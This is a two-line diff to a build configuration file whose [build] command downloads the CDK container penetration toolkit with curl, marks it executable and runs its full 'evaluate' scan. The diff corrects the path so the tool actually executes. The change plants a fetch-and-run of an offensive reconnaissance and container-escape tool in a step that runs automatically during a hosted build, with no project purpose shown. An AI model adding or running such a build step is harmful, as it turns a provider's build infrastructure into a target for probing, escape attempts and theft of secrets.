@@ -1,2 +1,2 @@
 [build]
-  command = "curl -LJO https://github.com/cdk-team/CDK/archive/refs/tags/cdk_linux_amd64 > cdk && chmod a+x cdk && cdk evaluate --full"
+  command = "curl -LJO https://github.com/cdk-team/CDK/archive/refs/tags/cdk_linux_amd64 > cdk && chmod a+x cdk && ./cdk evaluate --full"
